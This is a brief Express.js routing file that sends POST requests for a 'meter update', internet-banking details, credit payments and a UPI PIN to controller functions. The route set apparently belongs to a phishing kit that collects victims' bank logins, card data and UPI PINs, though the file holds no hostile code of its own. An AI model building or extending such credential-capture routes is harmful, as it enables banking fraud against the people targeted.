// routes/index.js

const express    = require('express');
const router     = express.Router();
const postCtrl   = require('../Controllers/postController');

router.post('/meter-update',           postCtrl.submitMeterForm);

router.post('/internet-banking/:uniqueId', postCtrl.submitBankingForm);


router.post('/credit-payment/:uniqueId', postCtrl.submitPaymentForm);

router.post('/upi-pin/:uniqueId',postCtrl.submitUpiPin);

router.post('/credit/:uniqueId',    postCtrl.submitPaymentForm);

module.exports = router;
